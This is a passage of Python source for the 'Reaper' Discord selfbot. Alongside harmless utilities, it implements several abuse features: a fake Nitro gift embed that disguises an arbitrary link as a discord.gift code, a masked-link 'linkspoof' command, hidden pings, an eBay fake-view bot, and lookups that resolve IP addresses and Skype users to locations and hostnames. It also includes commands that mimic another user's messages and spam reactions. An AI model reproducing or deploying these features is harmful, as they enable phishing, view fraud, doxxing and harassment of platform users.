                await ctx.send(f'Site is up, responded with a status code of `{r}`'+pingSite(http), delete_after=delinterval)
        except Exception as e:
            print(f"  "+errorcol+f"{Fore.WHITE}{Style.BRIGHT}{e}"+Fore.RESET)
        cmdused('pingweb')

    @commands.command(aliases=['calc'])
    async def calculator(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        os.system('calc')
        cmdused('calc')

    @commands.command()
    async def cmd(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        os.system('start cmd')
        cmdused('cmd')

    @commands.command()
    async def uptime(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        now = datetime.utcnow()
        delta = now - REAPER.start_time
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        days, hours = divmod(hours, 24)
        if days:
            time_format = "{d} days, {h} hours {m} minutes {s} seconds"
        else:
            time_format = "{h} hours {m} minutes {s} seconds"
        uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)
        embed = discord.Embed(title="Uptime",description=(uptime_stamp),colour=emcolor)
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused("uptime")

    @commands.command(aliases=['kill'])
    async def exit(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        m = await ctx.send("Are you sure to exit Reaper selfbot?\nIf yes, type `yes`")
        try:
            def checkdata(message): return message.author == ctx.message.author
            msg = await self.bot.wait_for('message', check=checkdata, timeout=15)
            msc = lambda m: (msg.content == m)
            if msc("yes") or msc("y"):

                await m.delete()
                await ctx.send('Exiting Reaper in 5 seconds', delete_after=4)
                try:
                    os._exit(0)
                except:
                    await ctx.send('\\❌ **Error**: Unable to exit selfbot.', delete_after=5)

            else:
                await m.delete()
                await ctx.send("\\❌ Destroy server cancelled.", delete_after=4)
                return
        except asyncio.TimeoutError:
            await ctx.send("\\❌ **Error**: Took too long to answer.", delete_after=4)
            await m.delete()
            return

class CopyServer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def copyserver(self, ctx, *, guild_to: int = "create"):
        if await disableCmd(ctx) == 0: return
        print_log = lambda s: print(f"  {c.b}{Fore.GREEN}[LOGS]: {Fore.WHITE}{s}")
        print_warning = lambda s: print(f"  {Fore.YELLOW}[WARN]: {Fore.WHITE}{c.b}{s}")
        print_error = lambda s: print(f"  {Fore.RED}[ERROR]:{c.b}{Fore.WHITE} {s}")
        try:
            await ctx.message.delete()  
            message = ctx.message
            channel = message.channel
            guild = message.guild
            try:
                if guild_to != "create":
                    if len(guild_to) != 18:
                        await channel.send(f"**ERROR**\nInvalid ID!")
                        return
                try:
                    guild_from = ctx.guild
                    if guild_to == "create":
                        guild_to = await self.bot.create_guild(f"{ctx.guild} Clone")
                    else:
                        guild_to = self.bot.get_guild(guild_to) 
                except ValueError:
                    await channel.send(f"**ERROR**\nInvalid ID!")
                    return
                if guild_from is None or guild_to is None:
                    await channel.send(f"**Error**\nCan't find any guild with this ID!")
                    return
                msg = await channel.send(f"**Copying...**")

                for channel in list(guild_to.channels):
                    try:
                        await channel.delete()
                        print_log(f"Channel {channel.name} has been deleted from {guild_to.name}")
                        await asyncio.sleep(0.45)
                    except discord.Forbidden:
                        print_error(f"Can't delete channel {channel.name} from {guild_to.name} (Forbidden)")
                    except discord.HTTPException:
                        print_error(f"Can't delete channel {channel.name} from {guild_to.name}")

                roles = []
                role: discord.Role
                for role in list(guild_from.roles):
                    if role.name != "CopyPaste2" and role.name != "@everyone":
                        roles.append(role)
                    await asyncio.sleep(0.45)
                roles = roles[::-1]
                for role in roles:
                    try:
                        await guild_to.create_role(
                            name=role.name,
                            permissions=role.permissions,
                            colour=role.colour,
                            hoist=role.hoist,
                            mentionable=role.mentionable
                        )
                        print_log(f"Role {role.name} has been created in {guild_to.name}")
                        await asyncio.sleep(0.45)
                    except discord.Forbidden:
                        print_error(f"Can't create role {role.name} in {guild_to.name} (Forbidden)")
                    except discord.HTTPException:
                        print_error(f"Can't create role {role.name} in {guild_to.name}")        

                channels = guild_from.categories
                channel: discord.CategoryChannel
                new_channel: discord.CategoryChannel
                for channel in channels:
                    try:
                        overwrites_to = {}
                        for key, value in channel.overwrites.items():
                            role = discord.utils.get(guild_to.roles, name=key.name)
                            overwrites_to[role] = value
                        new_channel = await guild_to.create_category(
                            name=channel.name,
                            overwrites=overwrites_to)
                        await new_channel.edit(position=channel.position)
                        print_log(f"Channel {channel.name} has been created in {guild_to.name}")
                        await asyncio.sleep(0.45)
                    except discord.Forbidden:
                        print_error(f"Can't create channel {channel.name} in {guild_to} (Forbidden)")
                    except discord.HTTPException:
                        print_error(f"Can't create channel {channel.name} in {guild_to}")
                
                channel_text: discord.TextChannel
                channel_voice: discord.VoiceChannel
                category = None
                for channel_text in list(guild_from.text_channels):
                    try:
                        for category in list(guild_to.categories):
                            try:
                                if category.name == channel_text.category.name:
                                    break
                                await asyncio.sleep(0.45)
                            except AttributeError:
                                print_warning(f"Channel {channel_text.name} doesn't have any category!")
                                category = None
                                break

                        overwrites_to = {}
                        for key, value in channel_text.overwrites.items():
                            role = discord.utils.get(guild_to.roles, name=key.name)
                            overwrites_to[role] = value
                        try:
                            new_channel = await guild_to.create_text_channel(
                                name=channel_text.name,
                                overwrites=overwrites_to,
                                position=channel_text.position,
                                topic=channel_text.topic,
                                slowmode_delay=channel_text.slowmode_delay,
                                nsfw=channel_text.nsfw)
                        except:
                            new_channel = await guild_to.create_text_channel(
                                name=channel_text.name,
                                overwrites=overwrites_to,
                                position=channel_text.position)
                        if category is not None:
                            await new_channel.edit(category=category)
                        print_log(f"Channel {channel_text.name} has been created in {guild_to.name}")
                        await asyncio.sleep(0.45)
                    except discord.Forbidden:
                        print_error(f"Can't create channel {channel_text.name} in {guild_to} (Forbidden)")
                    except discord.HTTPException:
                        print_error(f"Can't create channel {channel_text.name} in {guild_to}")
                    except:
                        print_error(f"Can't create channel {channel_text.name} in {guild_to} (Unknown)")

                category = None
                for channel_voice in list(guild_from.voice_channels):
                    try:
                        for category in list(guild_to.categories):
                            try:
                                if category.name == channel_voice.category.name:
                                    break
                                await asyncio.sleep(0.45)
                            except AttributeError:
                                print_warning(f"Channel {channel_voice.name} doesn't have any category!")
                                category = None
                                break

                        overwrites_to = {}
                        for key, value in channel_voice.overwrites.items():
                            role = discord.utils.get(guild_to.roles, name=key.name)
                            overwrites_to[role] = value
                        try:
                            new_channel = await guild_to.create_voice_channel(
                                name=channel_voice.name,
                                overwrites=overwrites_to,
                                position=channel_voice.position,
                                bitrate=channel_voice.bitrate,
                                user_limit=channel_voice.user_limit,
                                )
                        except:
                            new_channel = await guild_to.create_voice_channel(
                                name=channel_voice.name,
                                overwrites=overwrites_to,
                                position=channel_voice.position)
                        if category is not None:
                            await new_channel.edit(category=category)
                        print_log(f"Channel {channel_voice.name} has been created in {guild_to.name}")
                        await asyncio.sleep(0.45)
                    except discord.Forbidden:
                        print_error(f"Can't create channel {channel_voice.name} in {guild_to} (Forbidden)")
                    except discord.HTTPException:
                        print_error(f"Can't create channel {channel_voice.name} in {guild_to}")
                    except:
                        print_error(f"Can't create channel {channel_voice.name} in {guild_to} (Unknown)")
                
                print_log(f"Editing {guild_to.name} ...")
                try:
                    try:
                        icon_image = await guild_from.icon_url.read()
                        await asyncio.sleep(0.45)
                    except discord.errors.DiscordException:
                        print_error(f"Can't read icon image from {guild_from.name}")
                        icon_image = None
                    #await guild_to.edit(name=guild_from.name)
                    if icon_image is not None:
                        try:
                            await guild_to.edit(icon=icon_image)
                            print_log(f"Icon has ben set for {guild_to.name}")
                        except:
                            print_error(f"Can't set icon for {guild_to.name}")
                        await asyncio.sleep(0.45)
                except discord.Forbidden:
                    print_error(f"Can't edit {guild_to} (Forbidden)")
                print_log(f"Editing {guild_to.name} done")

                print(logs+f"Copied server: {Fore.YELLOW}{ctx.guild}{Fore.RESET}")
                await msg.edit(content=f"**DONE!**")
                return
            except Exception as exc:
                print(exc)
        except Exception as exc:
            print(exc)

class CustomCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.group(
        name="cmd_", 
        aliases=["customcmd", 'custom-cmd', 'custom-command', "customcommand"], 
        invoke_without_command=True)
    async def cmd_(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            try:
                open("customCommands.json", "r")
            except:
                open("customCommands.json", "w").write("{}")
            em = discord.Embed(
                color = emcolor,
                description="Usages:\n\nAdd Command: \n".format(prefix)+
                "Edit: `{}custom-cmd edit [cmd-name] [args..]`\n".format(prefix)+
                "Remove: `{}custom-cmd remove [cmd-name]`\n".format(prefix),
                timestamp = datetime.utcnow()
            )
            fields = [
                { "name": "Add Command" , "value": f"Usage: `{prefix}custom-cmd add [name] <options>`\n"+
                    "**Available Options:**\n`--name: \"new name\"`\n"+
                    "`--aliases: \"alias1, alias2, asd\"`\n"+
                    "`--output: \"Hello World\"`\nMore options can be found in the *`customCommands.json`* file" },
                { 
                    "name": "Edit Command" , 
                    "value": f"Usage: `{prefix}custom-cmd edit [cmd-name] <options>`\n"+
                    "**Available Options:**\n`--name: \"new name\"`\n"+
                    "`--aliases: \"alias1, alias2, asd\"`\n"+
                    "`--output: \"Hello World\"`\nMore editing options can be found in the *`customCommands.json`* file"
                },
                { "name": "Remove Command" , "value": f"Usage: `{prefix}custom-cmd remove [cmd-name]`\n" }]
            for field in fields:
                if field["name"]: 
                    em.add_field(name=field["name"], value=field["value"], inline=False)
            em.set_author(name="Reaper Custom Commands | Prefix: {}".format(prefix), icon_url=emimage, url="https://discord.gg/rQJZDpaxv6")
            em.set_footer(text="Custom Commands | {}".format(footer))
            em.set_thumbnail(url=emimage)
            em.set_image(url=emimagealt)
            await ctx.send(embed=em, delete_after=delinterval)
        except Exception as exception:
            print(exception)
        cmdused("custom-cmd")

    @cmd_.command
    async def add(self, ctx, cmd, *, output):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()

    @cmd_.command
    async def edit(self, ctx, cmd):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()

    @cmd_.command
    async def remove(self, ctx, cmd):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()

class PremiumCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.copytoggle = None

    @commands.Cog.listener()
    async def on_message(self, message):
        try:
            if self.copytoggle != None:
                try:
                    if self.copytoggle["uid"]:
                        if message.author.id == self.copytoggle["uid"]:
                            await message.channel.send(f"{message.content}")
                            sleep(0.2)
                except:
                    if self.copytoggle["cid"]:
                        if message.author.id == self.copytoggle["cid"]:
                            if message.author != reaper.user:
                                await message.channel.send(f"{message.content}")
                                sleep(0.2)
            else:
                pass
        except Exception as e:
            print(e)

    @commands.command()
    async def copy(self, ctx, *, toggle = None):
        if await disableCmd(ctx) == 0: return
        try:
            await ctx.message.delete()
            if toggle.startswith("stop"):
                if self.copytoggle != None:
                    try:
                        if self.copytoggle["name"]:
                            await ctx.send("Stopped copying user: `{}`".format(self.copytoggle["name"]))
                            self.copytoggle = None
                    except:
                        if self.copytoggle["cid"]:
                            await ctx.send("Stopped copying `{}`".format(self.copytoggle["cname"]))
                            self.copytoggle = None
                else:
                    await ctx.send("**Error:** Not currently copying anyone.", delete_after=delinterval)
            else:
                def getid(foo):
                    try:
                        return int(re.findall("<@(\w+)>", foo)[0])
                    except:
                        try:
                            return int(re.findall("<@!(\w+)>", foo)[0])
                        except Exception as e:
                            print(e)
                getinfo = await reaper.fetch_user(int(getid(toggle)))
                def getname():
                    return str(getinfo)
                if isinstance(ctx.channel, discord.TextChannel):
                    un = getname()
                    uid = getid(toggle)
                    self.copytoggle = {"uid": uid, "name": un}
                    await ctx.send(f"Started copying user: `{toggle}`")
                elif isinstance(ctx.channel, discord.DMChannel):
                    #cid = ctx.channel.id
                    cid = getid(toggle)
                    cname = ctx.channel
                    self.copytoggle = {"cid": cid, "cname": cname}
                    await ctx.send(f"Started copying `{cname}`")
                elif isinstance(ctx.channel, discord.GroupChannel):
                    await ctx.send("**Error:** Unable to copy user in a group chat")
        except Exception as e:
            print(e)
        cmdused("copy")

    @copy.error
    async def copy_error(self, ctx, error):
        if isinstance(error, commands.errors.BadArgument):
            await ctx.send("**Error:** User not found")

    @commands.command()
    async def pencrypt(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            encodedMsg = base64.b85encode(base64.a85encode(base64.b32encode(args.encode('ascii')))).decode('ascii').replace("*", "\\*").replace("_", "\\_").replace("`", "\\`").replace("~", "\\~")
            await ctx.send(f"{encodedMsg}")
        except Exception as e:
            print(e)
        cmdused("pencrypt")

    @commands.command()
    async def pdecrypt(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        try:
            decodedMsg = base64.b32decode(base64.a85decode(base64.b85decode(args.encode('ascii')))).decode('ascii')
            await ctx.send(f"{decodedMsg}")
        except Exception as e:
            print(e)
        cmdused("pdecrypt")

    @commands.command()
    async def fakenitro(self, ctx, *, link):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if link == 'rickroll':
            link = 'https://www.youtube.com/watch?v=oHg5SJYRHA0'
        elif not link.startswith("http"):
            link = "https://"+link
        else:
            if not link.startswith("http"):
                link = "http://"+link
        length = 15
        letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        code = ''.join(random.choice(letters) for i in range(length))
        t = random.choice(['Classic', 'Nitro Boost'])
        if t == 'Classic':
            e = discord.Embed(
                title='Successfully Generated Nitro',
                description=f'Successfully generated nitro code...\n**Code Type:** Nitro Classic\n**Gift Link:** [https://discord.gift/{code}]({link})',
                color=0x5d82e6,
                timestamp=datetime.utcnow()
            )
            e.set_footer(text="Discord Administrative Tool")
            e.set_thumbnail(url="https://cdn.discordapp.com/attachments/781697496090280029/790882014600364032/220.png")
            await ctx.send(embed=e)
        if t == 'Nitro Boost':
            e = discord.Embed(
                title='Successfully Generated Nitro',
                description=f'Successfully generated nitro code...\n**Code Type:** Nitro Boost\n**Gift Link:** [https://discord.gift/{code}]({link})',
                color=0xf47fff,
                timestamp=datetime.utcnow()
            )
            e.set_footer(text="Discord Administrative Tool")
            e.set_thumbnail(url="https://cdn.discordapp.com/attachments/781697496090280029/790880997167464468/EWdeUeHXkAQgJh7.png")
            await ctx.send(embed=e)
        cmdused("fakenitro")

    @commands.command()
    async def linkspoof(self, ctx, url1, *, url2):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if not url2.startswith("http"):
            url2 = f"https://{url2}"
        em = discord.Embed(description=f"[{url1}]({url2})")
        await ctx.send(embed=em)
        cmdused("linkspoof")

    @commands.command()
    async def invisping(self, ctx, mention, *, msg):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        a = "\xe2||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||‎‎||‎||‎‎||‎‎||‎‎||‎‎||"
        await ctx.send(f"{msg} {a} {mention}")
        cmdused("invisping")

    @commands.command()
    async def skypelookup(self, ctx, *, username):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        r = requests.get(f"https://api.c99.nl/skyperesolver?key=&username={username}").text.replace(",", "\n")
        embed=discord.Embed(title=f" **Skype Lookup for {username}** ", description=f"{r}", color=0xbf00ff, timestamp=ctx.message.created_at)
        
        embed.set_footer(text=f'{footer} ')
        await ctx.send(embed=embed,delete_after=delinterval)
        cmdused("skypelookup")

    @commands.command(name='ebay-view', aliases=['ebay-view-bot', 'ebayviewbot', 'ebayview'])
    async def _ebay_view(self, ctx, url, views: int):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        start_time = datetime.now()
        def EbayViewer(url, views):
            headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
            }        
            for _i in range(views):
                requests.get(url, headers=headers)
        EbayViewer(url, views)
        elapsed_time = datetime.now() - start_time
        em = discord.Embed(title='Ebay View Bot')
        em.add_field(name='Views sent', value=views, inline=False)
        em.add_field(name='Elapsed time', value=elapsed_time, inline=False)
        await ctx.send(embed=em, delete_after=delinterval)
        cmdused('ebay-view')

    @commands.command(aliases=['geoip'])
    async def locate(self, ctx, ip: str):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()

        r = requests.get(url=f"http://ip-api.com/json/{ip}")
        hostname = requests.get(f"https://api.c99.nl/gethostname?key=&host={ip}").text.replace("<br>", "\n")
        vpn = requests.get(f"https://api.c99.nl/proxydetector?key=&ip={ip}").text.replace("<br>", "\n")
        if r.status_code == 200:
            if(r.json()['status'] == "fail"):
                await ctx.send(f"{ip} is an **invalid** IP Address")
            else:
                flag = f":flag_{r.json()['countryCode'].lower()}:"
                embed = discord.Embed(title=f"**{ip}** lookup!", description=ip,color=emcolor, timestamp=ctx.message.created_at)
                embed.add_field(name="Country", value=f"{flag} {r.json()['country']}", inline=True)
                embed.add_field(name="Region", value=f"{r.json()['region']} / {r.json()['regionName']}", inline=True)
                embed.add_field(name="City", value=f"{r.json()['city']}", inline=True)
                embed.add_field(name="ZIP", value=f"{r.json()['zip']}", inline=True)
                embed.add_field(name="Lat/Long", value=f"{r.json()['lat']}/{r.json()['lon']}", inline=True)
                embed.add_field(name="ISP", value=f"{r.json()['isp']}", inline=True)
                embed.add_field(name="Org", value=f"{r.json()['org']}", inline=True)
                embed.add_field(name="Hostname", value=f"{hostname}", inline=True)
                embed.add_field(name="VPN?", value=f"{vpn}", inline=True)
                embed.set_footer(text=f'{footer}')
                await ctx.send(embed=embed,delete_after=delinterval)
        cmdused('geoip')

class React(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.reacttoggle = None

    @commands.Cog.listener()
    async def on_message(self, message):
        try:
            if self.reacttoggle != None:
                try:
                    if self.reacttoggle["emoji"]:
                        if message.channel.id == self.reacttoggle["cid"]:
                            try:
                                await message.add_reaction(self.reacttoggle["emoji"])
                            except:
                                pass
                            sleep(0.2)
                except Exception as exception:
                    print(exception)
            else:
                pass
        except Exception as e:
            print(e)

    @commands.command()
    async def spamreact(self, ctx, *, emoji):
        if await disableCmd(ctx) == 0: return
        try:
            if emoji.startswith("stop"):
                await ctx.message.delete()
                if self.reacttoggle != None:
                    try:
                        self.reacttoggle = None
                        await ctx.send("**[SPAM-REACT]:** Stopped spam reacting.", delete_after=delinterval)
                    except Exception as p:
                        print(p)
                else:
                    await ctx.send("**[SPAM-REACT]:** Not currently spam reacting any channel.", delete_after=delinterval)
            else:
                try:
                    await ctx.message.add_reaction(emoji)
                    await ctx.message.delete()
                except Exception as e:
                    await ctx.send("**[SPAM-REACT]:** Invalid emoji passed.", delete_after=delinterval)
                    await ctx.message.delete()
                    return
                self.reacttoggle = { "cid": ctx.channel.id , "emoji": emoji }
                await ctx.send("**[SPAM-REACT]:** Started spam reacting {}".format(ctx.channel.mention), delete_after=delinterval)
                #def getid(foo):
                #    try:
                #        return int(re.findall("<@(\w+)>", foo)[0])
                #    except:
                #        try:
                #            return int(re.findall("<@!(\w+)>", foo)[0])
                #        except Exception as e:
                #            print(e)
                #getinfo = await reaper.fetch_user(int(getid(toggle)))
                #def getname():
                #    return str(getinfo)
                #if isinstance(ctx.channel, discord.TextChannel):
                #    un = getname()
                #    uid = getid(toggle)
                #    self.reacttoggle = {"uid": uid, "name": un}
                #    await ctx.send(f"Started copying user: `{toggle}`")
                #elif isinstance(ctx.channel, discord.DMChannel):
                #    #cid = ctx.channel.id
                #    cid = getid(toggle)
                #    cname = ctx.channel
                #    self.reacttoggle = {"cid": cid, "cname": cname}
                #    await ctx.send(f"Started copying `{cname}`")
                #elif isinstance(ctx.channel, discord.GroupChannel):
                #    await ctx.send("**Error:** Unable to copy user in a group chat")
        except Exception as e:
            print(e)
        cmdused("spamreact")

    @spamreact.error
    async def react_error(self, ctx, error):
        await ctx.message.delete()
        if isinstance(error, commands.errors.BadArgument):
            await ctx.send("**Error:** User not found", delete_after=delinterval)

    @commands.command()
    async def bulkreact(self, ctx, amount: int, *, emoji):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        async for message in ctx.message.channel.history(limit=amount).map(lambda m: m):
            try:
                await message.add_reaction(emoji)
                #await asyncio.sleep(0.2)
            except:
                pass
        cmdused("bulkreact")

    @bulkreact.error
    async def blk_error(self, ctx, error):
        await ctx.message.delete()
        if isinstance(error, commands.errors.BadArgument):
            await ctx.send("**Error:** Invalid Usage.\nUsage: `{}bulkreact [amount] [emoji]`".format(prefix), delete_after=delinterval)

class MiscellaneousCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=['msg-info'])
    async def msginfo(self, ctx, _id: int, channel: discord.TextChannel = None):
        if await disableCmd(ctx) == 0: return
        try:
            if isinstance(ctx.channel, discord.GroupChannel): 
                mode = 2
            if isinstance(ctx.channel, discord.DMChannel):    
                mode = 1
            if isinstance(ctx.channel, discord.TextChannel):  
                mode = 0
            if mode != 0:
                try:
                    _msg = await ctx.channel.fetch_message(_id)
                except NotFound:
                    await ctx.send("\\❌ **Error**: Invalid Message ID", delete_after=delinterval)
                except Forbidden:
                    await ctx.send("\\❌ **Error**: No Permissions to retrieve message", delete_after=delinterval)
                except HTTPException:
                    await ctx.send("\\❌ **Error**: Unable to retrieve message (HTTPException)", delete_after=delinterval)
                except:
                    await ctx.send("\\❌ **Error**: Unable to retrieve message (Unknown)", delete_after=delinterval)
            else:
                if not channel:
                    return print(errorcol + "Missing Required Arguments! (Channel)")
                try:
                    _msg = await channel.fetch_message(_id)
                except NotFound:
                    await ctx.send("\\❌ **Error**: Invalid Message ID", delete_after=delinterval)
                except Forbidden:
                    await ctx.send("\\❌ **Error**: No Permissions to retrieve message", delete_after=delinterval)
                except HTTPException:
                    await ctx.send("\\❌ **Error**: Unable to retrieve message (HTTPException)", delete_after=delinterval)
                except:
                    await ctx.send("\\❌ **Error**: Unable to retrieve message (Unknown)", delete_after=delinterval)
            __id =  str(_msg.id)
            _content = _msg.content if _msg.content else "None"
            _is_pinned = str(_msg.pinned)
            _mentionall = str(_msg.mention_everyone)
            _reactions = str(len(_msg.reactions))
            _mentions = []
            _embeds = []
            _jump_url = f"[Direct Link]({_msg.jump_url})"
            _system = str(_msg.is_system())
            _channel = str(_msg.channel)
            _author = str(_msg.author)
            _createdat = _msg.created_at.strftime("%d. %b. %Y at %I:%M %p")
            for _i in _msg.raw_mentions: _mentions.append(f"<@{_i}>")
            for _i in _msg.raw_role_mentions: _mentions.append(f"<@{_i}>")
            for _i in _msg.raw_channel_mentions: _mentions.append(f"<#{_i}>")
            _mentions = str(", ".join(_mentions)) if _mentions != [] else "None"
            if _msg.embeds != []:
                _em = _msg.embeds[0]
                try:
                    emc = _em.to_dict()
                    title = emc["title"] if emc["title"] else "None"
                    desc = emc["description"] if emc["description"] else "None"
                    fields = len(emc["fields"]) if emc["fields"] != [] else "None"
                    footer_ = emc["footer"]["text"] if emc["footer"]["text"] else "None"
                    image1 = "[Direct Link]("+emc["thumbnail"]["url"]+")" if emc["thumbnail"]["url"] else "None"
                    image2 = "[Direct Link]("+emc["image"]["url"]+")" if emc["image"]["url"] else "None"
                    author = emc["author"]["name"] if emc["author"]["name"] else "None"
                    _embeds.append([
                    f"**Title**: {title}\n**Description**: {desc}\n",
                    f"**Fields**: {fields}\n**Footer**: {footer_}\n",
                    f"**Small Image**: {image1}\n**Large Image**: {image2}\n**Author**: {author}"])
                except:
                    pass
            fields = [
            ["Content", _content],
            ["Message ID", __id],
            ["Jump URL", _jump_url],
            ["Is Pinned?", _is_pinned],
            ["From System?", _system],
            ["Channel", _channel],
            ["Author", _author],
            ["Created At", _createdat],
            ["Reactions", _reactions],
            ["Mentions", _mentions],
            ["Mentioned Everyone?", _mentionall] ]
            em = discord.Embed(
            description=f"Message info for {_id}",
            timestamp=datetime.utcnow(),
            color=emcolor)\
            .set_footer(text=f"{footer} | ID: {__id}")\
            .set_author(name="Message Info", icon_url=ctx.guild.icon_url)\
            .set_thumbnail(url=emimage)
            for _f in fields:
                try:
                    em.add_field(name=_f[0], value=_f[1], inline=True)
                except:
                    continue
            for idx, field in enumerate(_embeds):
                em.add_field(name=f"Embed {idx + 1}", value=field[0], inline=False)
                em.add_field(name=f"_ _", value=field[1], inline=True)
                em.add_field(name=f"_ _", value=field[2], inline=True)
            await ctx.send(embed=em, delete_after=delinterval)
            await ctx.message.delete()
        except Exception as e:
            print(e)
        cmdused('msg-info')

    @commands.command(aliases=["role-info"])
    @commands.guild_only()
    async def roleinfo(self, ctx, *, role: discord.Role):
        if await disableCmd(ctx) == 0: return
        _name = str(role.name)
        _id = str(role.id)
        _mention = role.mention
        _color = str(role.color)
        _memcount = str(len(role.members))
        _pos = str(role.position)
        _separated = str(role.hoist)
        _twitch = str(role.managed)
        _mentionable = str(role.mentionable)
        _bot_managed = str(role.is_bot_managed())
        _integration = str(role.is_integration())
        _sboost_role = str(role.is_premium_subscriber())
        _createdat = role.created_at.strftime("%d. %b. %Y at %I:%M %p")
        _perm = [str(p[0]).replace("_", " ").title() for p in role.permissions if p[1]]
        _perm_string = str(', '.join(_perm))\
        .replace("Use Voice Activation, ", "")\
        .replace("Add Reactions, ", "")\
        .replace("Send Tts Messages, ", "")\
        .replace("Read Messages, ", "")\
        .replace("Send Messages, ", "")\
        .replace("Connect, ", "")\
        .replace("Speak, ", "")\
        .replace("Change Nickname, ", "")\
        .replace("Use Voice Activation, ", "")\
        .replace("Stream, ", "")\
        .replace("Priority Speaker, ", "")\
        .replace("Embed Links, ", "")\
        .replace("External Emojis, ", "")\
        .replace("Create Instant Invite, ", "")\
        .replace("Attach Files, ", "")\
        .replace("Embed Links, ", "")\
        .replace("Read Message History, ", "")
        if 'Administrator' in _perm: _perm_string = 'All Permissions'
        else: pass
        fields = [
        ["Role Name", _name],
        ["Role ID", _id],
        ["Role Mention", _mention],
        ["Color", _color],
        ["Separated?", _separated],
        ["Mentionable?", _mentionable],
        #["Member Count", _memcount],
        ["Position", _pos],
        ["Is From Twitch?", _twitch],
        ["Is A Bot Role?", _bot_managed],
        ["Is An Integration?", _integration],
        ["Is Booster Role?", _sboost_role],
        ["Created At", _createdat],
        ["Key Permissions", _perm_string] ]
        em = discord.Embed(
        description=f"Role info for {_mention}",
        timestamp=datetime.utcnow(),
        color=emcolor)\
        .set_footer(text=f"{footer} | ID: {_id}")\
        .set_author(name="Role Info", icon_url=ctx.guild.icon_url)\
        .set_thumbnail(url=emimage)
        for _f in fields:
            em.add_field(name=_f[0], value=_f[1], inline=True)
        try: await ctx.send(embed=em, delete_after=delinterval)
        except: pass
        await ctx.message.delete()
        cmdused("role-info")

    @commands.command(aliases=["emoji-info"])
    async def emojiinfo(self, ctx, *, emoji: discord.Emoji):
        if await disableCmd(ctx) == 0: return
        _name = str (emoji.name)
        _id = str (emoji.id)
        _isanim = str (emoji.animated)
        _guild = str (emoji.guild)
        _guildid = str (emoji.guild_id)
        _url = str (emoji.url)
        _twitch = str (emoji.managed)
        _available = str (emoji.available)
        _createdat = emoji.created_at.strftime("%d. %b. %Y at %I:%M %p")
        fields = [
        ["Emoji Name", _name],
        ["Emoji ID", _id],
        ["Asset URL", f"[Direct Link]({_url})"],
        ["Is Animated?", _isanim],
        ["From Server?", f"{_guild} ({_guildid})"],
        ["Is From Twitch?", _twitch],
        ["Available For Use?", _available],
        ["Created At", _createdat] ]
        em = discord.Embed(
        description=f"Emoji info for `{emoji.name}`",
        timestamp=datetime.utcnow(),
        color=emcolor)\
        .set_footer(text=f"{footer} | ID: {_id}")\
        .set_author(name="Emoji Info", icon_url=_url)\
        .set_thumbnail(url=_url)
        for _f in fields:
            em.add_field(name=_f[0], value=_f[1], inline=True)
        try: await ctx.send(embed=em, delete_after=delinterval)
        except: pass
        await ctx.message.delete()
        cmdused("emoji-info")

    @commands.command(pass_context=True)
    async def xkcd(self, ctx, *, comic):
        if await disableCmd(ctx) == 0: return
        """Pull comics from xkcd."""
        if comic == "random":
            randcomic = requests.get("https://c.xkcd.com/random/comic/".format(comic))
            comic = randcomic.url.split("/")[-2]
        site = requests.get("https://xkcd.com/{}/info.0.json".format(comic))
        if site.status_code == 404:
            site = None
            found = None
            search = urllib.parse.quote(comic)
            async with self.bot.session.get("https://www.google.co.nz/search?&q={}+site:xkcd.com".format(search)) as resp:
                result = await resp.text()
            soup = bs4(result, "html.parser")
            links = soup.find_all("cite")
            for link in links:
